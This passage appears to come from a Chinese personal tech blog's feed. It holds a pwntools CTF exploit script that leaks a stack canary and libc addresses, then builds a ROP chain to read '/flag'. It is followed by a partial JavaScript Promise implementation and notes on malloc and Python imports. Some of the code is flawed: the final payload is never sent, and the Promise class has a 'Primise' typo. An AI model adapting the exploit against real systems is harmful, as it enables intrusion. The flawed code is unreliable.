class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./attachment-42&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">io = process(<span class="string">&quot;./attachment-42&quot;</span>)</span><br><span class="line"><span class="comment"># io = remote(&quot;101.200.155.151&quot;, 12500)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># script = &quot;&quot;&quot;set context-output /dev/pts/5&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># gdb.attach(io,script)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">prctl_got = elf.got[<span class="string">&#x27;prctl&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;puts@libc&gt;: 0x7f334c5ff5a0</span></span><br><span class="line"><span class="comment"># &lt;read@libc&gt;: 0x7f334c682e90</span></span><br><span class="line"></span><br><span class="line">func1_addr = elf.symbols[<span class="string">&#x27;func_1&#x27;</span>]</span><br><span class="line">func2_addr = elf.symbols[<span class="string">&#x27;func_0&#x27;</span>]</span><br><span class="line"></span><br><span class="line">delim = <span class="string">b&quot;where are you go?\n&quot;</span></span><br><span class="line">io.sendlineafter(delim, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fmtstr1 = <span class="string">b&quot;%9$s%10$s%11$s%12$s&quot;</span></span><br><span class="line">fmtstr1 = <span class="string">b&quot;%7$s%8$s&quot;</span></span><br><span class="line">fmtstr1= fmtstr1.ljust(((<span class="built_in">len</span>(fmtstr1) - <span class="number">1</span>) // <span class="number">8</span> + <span class="number">1</span>) * <span class="number">8</span>, <span class="string">b&#x27;#&#x27;</span>)</span><br><span class="line">padding = cyclic(<span class="number">0x28</span> - <span class="built_in">len</span>(fmtstr1) - <span class="number">2</span> * <span class="number">8</span>)</span><br><span class="line">payload1 = flat(fmtstr1, puts_got, read_got, padding, <span class="string">b&#x27;#&#x27;</span>)</span><br><span class="line">padding = cyclic(<span class="number">0x28</span>)</span><br><span class="line">payload1 = flat(padding, <span class="string">b&#x27;#&#x27;</span>)</span><br><span class="line">delim = <span class="string">b&quot;Enter you password:\n&quot;</span></span><br><span class="line">io.sendafter(delim, payload1)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;#&#x27;</span>)</span><br><span class="line">canary = u64(io.recv(<span class="number">7</span>).rjust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">stack_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*]Canary=&quot;</span>, <span class="built_in">hex</span>(canary))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&lt;stack@addr&gt;:&quot;</span>, <span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">padding = cyclic(<span class="number">0x28</span>)</span><br><span class="line">payload2 = flat(padding, canary)</span><br><span class="line">delim = <span class="string">b&quot;I will check your password:\n&quot;</span></span><br><span class="line">io.sendafter(delim, payload2)</span><br><span class="line"></span><br><span class="line">delim = <span class="string">b&quot;where are you go?\n&quot;</span></span><br><span class="line">io.sendlineafter(delim, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret1_addr = <span class="number">0x4014F1</span></span><br><span class="line">fmtstr1 = <span class="string">b&quot;%7$s%8$s&quot;</span></span><br><span class="line">fmtstr1= fmtstr1.ljust(((<span class="built_in">len</span>(fmtstr1) - <span class="number">1</span>) // <span class="number">8</span> + <span class="number">1</span>) * <span class="number">8</span>, <span class="string">b&#x27;#&#x27;</span>)</span><br><span class="line">padding = cyclic(<span class="number">0x28</span> - <span class="built_in">len</span>(fmtstr1) - <span class="number">2</span> * <span class="number">8</span>)</span><br><span class="line">payload3 = flat(fmtstr1, puts_got, read_got, padding, canary, stack_addr, ret1_addr)</span><br><span class="line">delim = <span class="string">b&quot;We have a lot to talk about\n&quot;</span></span><br><span class="line">io.sendafter(delim, payload3)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">puts_libc = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&lt;puts@libc&gt;:&quot;</span>, <span class="built_in">hex</span>(puts_libc))</span><br><span class="line">read_libc = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc_base = puts_libc - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">open_libc = libc_base + libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">write_libc = libc_base + libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&lt;libc@base&gt;:&quot;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&lt;open@libc&gt;:&quot;</span>, <span class="built_in">hex</span>(open_libc))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&lt;read@libc&gt;:&quot;</span>, <span class="built_in">hex</span>(read_libc))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&lt;write@libc&gt;:&quot;</span>, <span class="built_in">hex</span>(write_libc))</span><br><span class="line"></span><br><span class="line">O_RDONLY = <span class="number">0</span></span><br><span class="line">fd = <span class="number">3</span></span><br><span class="line">STDOUT = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x40119a</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x40119c</span></span><br><span class="line">stack_addr -= <span class="number">0x20</span></span><br><span class="line">flag = <span class="string">&quot;/flag\x00&quot;</span></span><br><span class="line">flag_addr = stack_addr + <span class="number">18</span> * <span class="number">8</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&lt;flag@addr&gt;:&quot;</span>, flag_addr)</span><br><span class="line">rdi = O_RDONLY</span><br><span class="line">padding = cyclic(<span class="number">0x28</span>)</span><br><span class="line">payload4 = flat(padding, canary, stack_addr, pop_rdi_ret, O_RDONLY, pop_rsi_r15_ret, flag_addr, <span class="number">0xdeadbeef</span>, open_libc, </span><br><span class="line">                pop_rdi_ret, fd, pop_rsi_r15_ret, flag_addr, <span class="number">0xdeadbeef</span>, read_libc,</span><br><span class="line">                pop_rdi_ret, STDOUT, flag_addr, <span class="number">0xdeadbeef</span>, write_libc, </span><br><span class="line">                flag)</span><br><span class="line">delim = <span class="string">b&quot;We have a lot to talk about\n&quot;</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Promise大致实现</title>
      <link href="/2024/01/21/Promise%E5%A4%A7%E8%87%B4%E5%AE%9E%E7%8E%B0/"/>
      <url>/2024/01/21/Promise%E5%A4%A7%E8%87%B4%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Promise</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="variable constant_">PENDING</span> = <span class="string">&quot;待定&quot;</span>; <span class="keyword">static</span> <span class="variable constant_">FULFILLED</span> = <span class="string">&quot;成功&quot;</span>; <span class="keyword">static</span> <span class="variable constant_">REJECTED</span> = <span class="string">&quot;拒绝&quot;</span>;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">func</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">status</span> = <span class="title class_">Promise</span>.<span class="property">PENDING</span>; <span class="comment">// status作为Promise的状态</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">result</span> = <span class="literal">null</span>; <span class="comment">// result作为Promise的结果值</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">resolveCallbacks</span> = [];</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">rejectCallbacks</span> = [];</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 在通过执行func来调用resolve或reject方法时</span></span><br><span class="line">            <span class="comment">// 由于func定义在类的外面，所以func调用这两个方法后，</span></span><br><span class="line">            <span class="comment">// 这两个方法中的this不再是promise对象</span></span><br><span class="line">            <span class="comment">// 所以需要bind来生成一个绑定this的函数</span></span><br><span class="line">            <span class="title function_">func</span>(<span class="variable language_">this</span>.<span class="property">resolve</span>.<span class="title function_">bind</span>(<span class="variable language_">this</span>), <span class="variable language_">this</span>.<span class="property">reject</span>.<span class="title function_">bind</span>(<span class="variable language_">this</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (error) &#123; <span class="comment">// 可能会在自定义的func函数中抛出错误</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">reject</span>(error);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">resolve</span>(<span class="params">result</span>) &#123; <span class="comment">// resolve方法是异步方法</span></span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">status</span> === <span class="title class_">Promise</span>.<span class="property">PENDING</span>) &#123;</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">status</span> = <span class="title class_">Promise</span>.<span class="property">FULFILLED</span>;</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">result</span> = result;</span><br><span class="line">                <span class="comment">// 如果then方法先被先于resolve方法被调用</span></span><br><span class="line">                <span class="comment">// 那么待执行数组里的函数就是then要执行的函数</span></span><br><span class="line">                <span class="comment">// 由resolve方法代替then去逐个执行待执行数组中的函数</span></span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">resolveCallbacks</span>.<span class="title function_">forEach</span>(<span class="function"><span class="params">callback</span> =&gt;</span>  &#123;</span><br><span class="line">                    <span class="title function_">callback</span>(result);</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">reject</span>(<span class="params">result</span>) &#123; <span class="comment">// reject方法是异步方法</span></span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">status</span> === <span class="title class_">Promise</span>.<span class="property">PENDING</span>) &#123;</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">status</span> = <span class="title class_">Promise</span>.<span class="property">REJECTED</span>;</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">result</span> = result;</span><br><span class="line">                <span class="comment">// 如果then方法先被先于reject方法被调用</span></span><br><span class="line">                <span class="comment">// 那么待执行数组里的函数就是then要执行的函数</span></span><br><span class="line">                <span class="comment">// 由reject方法代替then去逐个执行待执行数组中的函数</span></span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">rejectCallbacks</span>.<span class="title function_">forEach</span>(<span class="function"><span class="params">callback</span> =&gt;</span>  &#123;</span><br><span class="line">                    <span class="title function_">callback</span>(result);</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">then</span>(<span class="params">onFULFILLED, onREJECTED</span>) &#123;  </span><br><span class="line">        onREJECTED = <span class="keyword">typeof</span> onREJECTED === <span class="string">&#x27;function&#x27;</span> ? onREJECTED : <span class="function">() =&gt;</span> &#123;&#125;;</span><br><span class="line">        onFULFILLED = <span class="keyword">typeof</span> onFULFILLED === <span class="string">&#x27;function&#x27;</span> ? onFULFILLED : <span class="function">() =&gt;</span> &#123;&#125;;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">status</span> === <span class="title class_">Primise</span>.<span class="property">PENDING</span>) &#123;</span><br><span class="line">            <span class="comment">// 如果执行then时,promise对象的的状态还没出来,</span></span><br><span class="line">            <span class="comment">// 就把要执行的两个自定义函数推入待执行数组中</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">resolveCallbacks</span>.<span class="title function_">push</span>(onFULFILLED);</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">rejectCallbacks</span>.<span class="title function_">push</span>(onREJECTED);</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">status</span> === <span class="title class_">Promise</span>.<span class="property">FULFILLED</span>) &#123;</span><br><span class="line">            <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                <span class="title function_">onFULFILLED</span>(<span class="variable language_">this</span>.<span class="property">result</span>);</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">status</span> === <span class="title class_">Promise</span>.<span class="property">REJECTED</span>) &#123;</span><br><span class="line">            <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                <span class="title function_">onREJECTED</span>(<span class="variable language_">this</span>.<span class="property">result</span>);</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>; <span class="comment">// 这里还需要返回一个promise对象实现链式调用</span></span><br><span class="line">                     <span class="comment">// 但不是像这样直接返回自己需要新建一个promise对象</span></span><br><span class="line">                     <span class="comment">// 具体还有待开发</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> promise = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 在创建promise对象时，调用Promise类自带的resolve和reject两个方法</span></span><br><span class="line">    <span class="comment">// 来确定promise对象的状态和结果值</span></span><br><span class="line">    <span class="title function_">resolve</span>(<span class="string">&quot;一切正常&quot;</span>);</span><br><span class="line">&#125;)</span><br><span class="line">promise.<span class="title function_">then</span>( <span class="comment">// then方法根据promise对象状态来选择要执行的自定义函数</span></span><br><span class="line">    <span class="function"><span class="params">result</span> =&gt;</span> &#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(result)&#125;,</span><br><span class="line">    <span class="function"><span class="params">result</span> =&gt;</span> &#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(result.<span class="property">message</span>)&#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> JS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn-heap malloc函数</title>
      <link href="/2024/01/04/pwn-heap/"/>
      <url>/2024/01/04/pwn-heap/</url>
      
        <content type="html"><![CDATA[<p>那么当我们在程序中第一次申请了一块空间时到底发生了什么？</p><blockquote><p>&#x3D;&#x3D;提前科普&#x3D;&#x3D;：</p><p>为了防止你会懵 B 所以对于有些下文会提到但是已经涉及到的东西讲解一下：</p><ol><li><strong>Top chunk</strong>: 当程序第一次进行 malloc 的时候， heap 会被分为两块，一块给用户，剩下的那块就是 Top chunk ，再次申请堆块要是没有合适的空间便会使用 Top chunk 的空间。</li><li>你申请到的一块堆内存的起始地址你可以写入数据的起始地址，因为堆块头部会记录一些信息，所以你会看到下面的示例中有 <code>0x10 </code>大小差距。</li><li>你申请的大小 ≠ 实际申请大小，他会有一个的取整的步骤。</li></ol></blockquote><p> <strong>malloc() 函数:</strong></p><p>分配所需的内存空间，并返回一个指向它的指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  malloc(size_t n)</span></span><br><span class="line"><span class="comment">  Returns a pointer to a newly allocated chunk of at least n bytes, or null</span></span><br><span class="line"><span class="comment">  if no space is available. Additionally, on failure, errno is</span></span><br><span class="line"><span class="comment">  set to ENOMEM on ANSI C systems.</span></span><br><span class="line"><span class="comment">  If n is zero, malloc returns a minumum-sized chunk. (The minimum</span></span><br><span class="line"><span class="comment">  size is 16 bytes on most 32bit systems, and 24 or 32 bytes on 64bit</span></span><br><span class="line"><span class="comment">  systems.)  On most systems, size_t is an unsigned type, so calls</span></span><br><span class="line"><span class="comment">  with negative arguments are interpreted as requests for huge amounts</span></span><br><span class="line"><span class="comment">  of space, which will often fail. The maximum supported value of n</span></span><br><span class="line"><span class="comment">  differs across systems, but is in all cases less than the maximum</span></span><br><span class="line"><span class="comment">  representable value of a size_t.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">void</span>* <span class="title function_">malloc</span><span class="params">(<span class="type">size_t</span> size)</span>;</span><br></pre></td></tr></table></figure><p>参数 size ：要分配的字节大小，是无符号整数，如果你输入了 <code>-1</code> ，理论上会有一个很大很大的堆，实际上会报错，因为确实很大！</p><p>返回值：如果分配成功，则返回指向堆数据可写位置的指针；如果分配失败，则返回<code>NULL</code>。</p><p>可以看出，malloc 函数返回对应大小字节的内存块的指针。此外，该函数还对一些异常情况进行了处理</p><ul><li>当 size&#x3D;0 时，返回当前系统允许的堆的最小内存块。</li><li>当 size 为负数时，由于在大多数系统上，<strong>size_t 是无符号数（这一点非常重要）</strong>，所以程序就会申请很大的内存空间，但通常来说都会失败，因为系统没有那么多的内存可以分配。</li></ul><p><strong>free() 函数：</strong></p><p>释放之前调用 calloc 、 malloc 或 realloc 所分配的内存空间。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">free</span><span class="params">(<span class="type">void</span>* ptr)</span>;</span><br></pre></td></tr></table></figure><p>参数 ptr ：指针指向一个要释放内存的内存块。如果传递的参数是一个空指针，则不会执行任何动作，<strong><u>注意 free() 不会清除内存块的数据</u></strong>。</p><p>无返回值。</p><ul><li><strong>当 p 为空指针时，函数不执行任何操作。</strong></li><li>当 p 已经被释放之后，再次释放会出现乱七八糟的效果，这其实就是 <code>double free</code>。</li><li>除了被禁用 (mallopt) 的情况下，当释放很大的内存空间时，程序会将这些内存空间还给系统，以便于减小程序所使用的内存空间。</li></ul><blockquote><p>提前科普：</p><p>一般使用 free() 函数释放的堆块不会立刻被回收，它们会变成一种叫Free Chunk 的东西并且加上了一种类似 xxx bin 的名字，一般这类堆块释放后如果挨着一个也被释放的堆块或者是 Top Chunk 会合并，当然请记住 Fast Bin 是一个特例一它不会轻易合并。</p></blockquote><p><strong>calloc() 函数：</strong></p><p>分配所需的内存空间，并返回一个（一组）指向它（它们）的指针。<strong><u>malloc 和 calloc 之间的不同点是， malloc不会设置内存为零，而calloc 会设置分配的内存为零。</u></strong></p><p>分配<code>nitems</code>个<code>size</code>大小的堆块</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span>* <span class="title function_">calloc</span><span class="params">(<span class="type">size_t</span> nitems, <span class="type">size_t</span> size)</span>;</span><br></pre></td></tr></table></figure><p>参数 nitems ：需要的堆块数量，也是无符号数。</p><p>返回值：如果分配成功，则返回一个（一组）指向分配的堆块（堆块们）的指针；如果分配失败，则返回 NULL。</p><p><strong>realloc()函数：</strong></p><p>更改已经配置的内存空间，即更改由 malloc() 函数分配的内存空间的大小。<code>realloc() = malloc() + free()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span>* <span class="title function_">realloc</span><span class="params">(<span class="type">void</span>* ptr, <span class="type">size_t</span> size)</span>;</span><br></pre></td></tr></table></figure><p>参数 *ptr ：一个指针，指向堆块或者为null</p><p>返回值：看情况，下文会说。</p><ol><li><p>size &gt; ptr→size，申请扩大堆块</p><ol><li>当前内存段后面有空闲空间（指已经申请过但没有被利用的空间），则直接吞并部分空闲空间，返回原指针。</li><li>当前内存段后面没有空闲空间，或者空闲空间不够，那么就使用堆中第一个满足这一要求的内存块，将目前的数据复制到新的位置，并将原来的数据块释放掉，返回新的内存块位置相当于 <code>malloc(size) + memcpy(dst, ptr, size) + free(ptr)</code>。</li></ol></li><li><p>size &lt; ptr→size，申请缩小堆块。堆块会直接缩小，被削减的内存会释放。释放的内存块可能会被合并可能不会被合并。</p><blockquote><p>提示： </p><p>这里的释放不是和 free()函数一样的释放，而是区别于free() 函数的释放内存方式，不过具体是什么以后再说吧。</p></blockquote></li><li><p><code>ptr == NULL</code> and <code>size != 0</code>，如果传入了一个空指针，但是 size 不为 0，那么<code>realloc()</code>只会申请内存，返回申请的内存地址，就相当于<code>malloc(size)</code>。</p></li><li><p><code>isValid(ptr)</code> and <code>size == 0</code>，如果传入了一个正常的堆块地址，但是 size 为 0那么<code>realloc()</code>只会释放空间，就相当于<code>free(ptr)</code>。且释放的堆会变为<code>fastbins</code>，可能内存也不会清除，效果与<code>free()</code>一样。</p></li><li><p>如果申请失败，将返回 NULL ，此时，原来的指针仍然有效。</p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python的import</title>
      <link href="/2023/07/18/python%E7%9A%84import/"/>
      <url>/2023/07/18/python%E7%9A%84import/</url>
      
        <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> my_module</span><br></pre></td></tr></table></figure><ol><li>寻找my_module.py文件</li><li>将my_module.py文件执行后放进缓存中，形成一个命名空间，并在主程序中生成一个变量命名为<strong>my_module</strong>，指向该命名空间</li><li>然后就能通过命名空间的方式使用里面的变量、函数或者类</li></ol><p><img src="D:\代码笔记\images\import01.png" alt="import01"></p><p><img src="D:\代码笔记\images\import00.png" alt="import00"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> my_module <span class="keyword">import</span> test1</span><br></pre></td></tr></table></figure><ol><li>运行my_module.py文件</li><li>从my_module.py文件里导入函数test1()，赋值给变量test1</li><li>但是my_module的命名空间并不会生成，也就没有my_module变量</li></ol><p><img src="D:\代码笔记\images\import02.png" alt="import02"></p><p><img src="D:\代码笔记\images\import03.png" alt="import03"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> package</span><br></pre></td></tr></table></figure><p>首先，package即包是一种特殊的模块，在进行导入时</p><ol><li>搜索是否有__init__.py文件</li><li>如果有，将该文件运行后生成有关该文件的命名空间，然后以<strong>package</strong>命名一个module变量指向这个命名空间，这个命名空间中不会有任何该包下的模块信息，也就是module1和module2，如果涉及这两个，程序会报错，找不到这两个变量</li><li>如果没有，那就啥事没有</li></ol><p><img src="D:\代码笔记\images\import04.png" alt="import04"></p><p><img src="D:\代码笔记\images\import05.png" alt="import05"></p><p><img src="D:\代码笔记\images\import06.png" alt="import06"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> package.module1</span><br></pre></td></tr></table></figure><ol><li>运行__init__.py和该包下的module1.py文件后生成2个命名空间</li><li>由package做为主程序的变量指向__init__.py所生成的命名空间，而在init生成的命名空间中会多出一个module1变量，指向module1.py生成的命名空间</li></ol><p><img src="D:\代码笔记\images\import08.png" alt="import08"></p><p><img src="D:\代码笔记\images\import07.png" alt="import07"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> package <span class="keyword">import</span> module1</span><br></pre></td></tr></table></figure><ol><li>运行init.py文件和module1.py文件，但是只生成一个由module1.py组成的命名空间</li><li>在主程序也只会有生成一个module1变量指向module1.py生成的命名空间</li><li>并不会有package变量的命名空间</li></ol><p><img src="D:\代码笔记\images\import09.png" alt="import09"></p><p><img src="D:\代码笔记\images\import10.png" alt="import10"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> package.module1 <span class="keyword">import</span> test</span><br></pre></td></tr></table></figure><ol><li>运行init.py和module1.py文件后不生成命名空间</li><li>将module1.py里的test()函数导入后生成test变量来指向这个函数</li></ol><p><img src="D:\代码笔记\images\import11.png" alt="import11"></p><p>总结：<u>导入包或者模块，执行文件后生成module变量指向命名空间</u></p><p><u>导入变量、函数、或者类执行文件后会直接生成对应的变量</u> </p><p>关于as</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> module <span class="keyword">as</span> m</span><br></pre></td></tr></table></figure><p>就是将导入的变量换个名称，比如将module变量改名为m，指向的对象还是一样的</p><p>不过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span 